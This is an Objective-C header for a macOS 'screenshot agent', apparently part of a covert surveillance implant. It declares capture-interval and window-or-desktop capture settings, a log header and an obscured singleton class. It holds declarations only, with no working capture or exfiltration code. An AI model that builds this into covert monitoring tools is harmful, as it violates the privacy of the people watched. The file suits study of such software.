/*
 * RCSMac - Screenshot agent
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 23/04/2009
 *  Modified by Massimo Chiodini
 *
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Cocoa/Cocoa.h>
#import <Carbon/Carbon.h>

#ifndef __RCSMAgentScreenshot_h__
#define __RCSMAgentScreenshot_h__

#import "RCSMLogManager.h"

typedef struct _screenshot {
  u_int sleepTime;
  u_int dwTag;
  u_int grabActiveWindow; // 1 Window - 0 Entire Desktop
  u_int grabNewWindows; // 1 TRUE onNewWindow - 0 FALSE
} screenshotStruct;

typedef struct _screenshotHeader {
	u_int version;
#define LOG_SCREENSHOT_VERSION 2009031201
	u_int processNameLength;
	u_int windowNameLength;
} screenshotAdditionalStruct;


@interface __m_MAgentScreenshot : NSObject <Agents>
{
@private
  NSMutableDictionary *mAgentConfiguration;
  uint32_t mSleepSec;
}

+ (__m_MAgentScreenshot *)sharedInstance;
+ (id)allocWithZone: (NSZone *)aZone;
- (id)copyWithZone: (NSZone *)aZone;
- (void)release;
- (id)autorelease;
- (id)retain;
- (unsigned)retainCount;

- (NSMutableDictionary *)mAgentConfiguration;
- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;


@end

#endif
